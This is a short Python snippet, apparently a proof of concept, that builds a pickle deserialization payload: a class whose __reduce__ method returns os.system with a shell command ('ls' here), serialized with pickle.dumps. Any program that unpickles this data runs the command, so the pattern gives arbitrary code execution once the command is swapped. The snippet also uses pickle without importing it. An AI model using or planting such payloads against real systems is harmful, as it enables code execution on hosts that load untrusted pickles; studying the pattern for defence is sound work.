import os

class Payload(object):
    def __reduce__(self):
        return os.system, ('ls',)  # Using os.system instead of exec

def makePickleData(payload: Payload):
    serialized_data = pickle.dumps(payload, protocol=0)
    return serialized_data